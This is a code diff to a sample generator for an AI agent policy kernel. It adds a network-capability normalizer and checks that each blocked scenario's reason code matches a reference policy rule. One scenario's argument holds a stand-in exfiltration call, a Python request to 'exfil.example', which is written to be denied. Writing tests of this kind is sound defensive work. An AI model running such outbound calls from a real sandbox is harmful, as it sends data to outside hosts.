@@ -10,11 +10,27 @@ import json
 import shutil
 import tarfile
 import tempfile
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Any, Optional
 
 FIXED_TIME = "2026-06-05T00:00:00Z"
+REPO_ROOT = Path(__file__).resolve().parents[1]
+
+
+def normalize_e2b_network(capability: Any) -> str:
+    """Normalize raw E2B network capability metadata into a stable enum.
+
+    E2B sandboxes have internet access enabled by default, so anything that is
+    not an explicit opt-out normalizes to "external" (fail closed).
+    """
+    if capability is False:
+        return "isolated"
+    if isinstance(capability, str):
+        if capability.strip().lower() in {"none", "isolated", "offline", "disabled", "false"}:
+            return "isolated"
+        return "external"
+    return "external"
 
 
 @dataclass(frozen=True)
@@ -31,6 +47,9 @@ class Scenario:
     policy: str
     arguments: dict[str, Any]
     source_urls: tuple[str, ...] = ()
+    # Runtime-derived facts the reference policy matched on that are not
+    # caller arguments (e.g. registry state, partial source errors).
+    policy_facts: dict[str, Any] = field(default_factory=dict)
 
 
 SCENARIOS = [
@@ -46,6 +65,7 @@ SCENARIOS = [
         dispatched=False,
         policy="policies/mcp.quarantine.strict.toml",
         arguments={"server_id": "gmail-local", "tool": "gmail.send_email"},
+        policy_facts={"mcp_server_state": "unknown"},
     ),
     Scenario(
         scenario_id="openai-proxy-side-effect-deny",
@@ -131,12 +151,18 @@ SCENARIOS = [
         title="E2B sandbox network egress is denied",
         action_urn="tool.e2b.execute",
         risk_class="T2",
-        effect_class="E3",
+        effect_class="E4",
         verdict="DENY",
         reason_code="SANDBOX_NETWORK_EGRESS_DENY",
         dispatched=False,
         policy="policies/agent.devtools.high_risk.toml",
-        arguments={"language": "python", "code": "import requests; requests.get('https://exfil.example')"},
+        arguments={
+            "language": "python",
+            "code": "import requests; requests.get('https://exfil.example')",
+            # E2B sandboxes default to internet access; the raw capability is
+            # normalized into the stable enum the reference policy matches on.
+            "network": normalize_e2b_network({"internet_access": True}),
+        },
     ),
     Scenario(
         scenario_id="composio-salesforce-export-deny",
@@ -181,6 +207,7 @@ SCENARIOS = [
             "ttl": 3600,
         },
         source_urls=("https://example.com/source-ok", "https://example.com/source-error"),
+        policy_facts={"partial_source_errors": True},
     ),
     Scenario(
         scenario_id="tinyfish-browser-credential-grant-escalate",
@@ -240,8 +267,58 @@ def validate_scenario(scenario: Scenario) -> None:
         raise ValueError(f"{scenario.scenario_id}: blocked verdicts must not dispatch")
 
 
+def _fact_satisfied(key: str, expected: Any, facts: dict[str, Any]) -> bool:
+    if key == "contains":
+        return any(isinstance(value, str) and expected in value for value in facts.values())
+    if expected is None:
+        return facts.get(key) is None
+    if expected == "*":
+        return facts.get(key) is not None
+    return facts.get(key) == expected
+
+
+def assert_reason_code_backed(scenario: Scenario) -> dict[str, Any]:
+    """Assert the scenario's reason code is backed by a reference-policy rule.
+
+    Returns the matched rule's facts so receipts can record the concrete
+    policy facts that produced the verdict. Fails generation if the reason
+    code has no backing rule, the verdict differs, or any policy fact is not
+    proven by the scenario's facts.
+    """
+    reference_path = REPO_ROOT / "policies" / "reference" / f"{Path(scenario.policy).stem}.json"
+    if not reference_path.exists():
+        raise ValueError(f"{scenario.scenario_id}: missing reference policy {reference_path.name}")
+    reference = json.loads(reference_path.read_text(encoding="utf-8"))
+    rules = [rule for rule in reference.get("rules", []) if rule.get("reason_code") == scenario.reason_code]
+    if not rules:
+        raise ValueError(
+            f"{scenario.scenario_id}: reason_code {scenario.reason_code} has no backing rule "
+            f"in {reference_path.name}"
+        )
+    rule = rules[0]
+    if rule.get("verdict") != scenario.verdict:
+        raise ValueError(
+            f"{scenario.scenario_id}: verdict {scenario.verdict} does not match reference rule "
+            f"verdict {rule.get('verdict')} for {scenario.reason_code}"
+        )
+    facts = {
+        "action_urn": scenario.action_urn,
+        "risk_class": scenario.risk_class,
+        **scenario.arguments,
+        **scenario.policy_facts,
+    }
+    for key, expected in rule.get("match", {}).items():
+        if not _fact_satisfied(key, expected, facts):
+            raise ValueError(
+                f"{scenario.scenario_id}: policy fact {key}={expected!r} required by "
+                f"{scenario.reason_code} is not proven by the scenario"
+            )
+    return dict(rule.get("match", {}))
+
+
 def receipt_for(scenario: Scenario) -> dict[str, Any]:
     validate_scenario(scenario)
+    policy_facts = assert_reason_code_backed(scenario)
     receipt = {
         "schema_version": "helm.integration.receipt.sample.v1",
         "scenario_id": scenario.scenario_id,
@@ -257,6 +334,7 @@ def receipt_for(scenario: Scenario) -> dict[str, Any]:
         "reason_code": scenario.reason_code,
         "dispatched": scenario.dispatched,
         "policy": scenario.policy,
+        "policy_facts": policy_facts,
         "arguments_hash": sha256(canonical_bytes(scenario.arguments)),
         "source": "generated by scripts/generate_samples.py",
         "kernel_source_truth": "helm-ai-kernel",
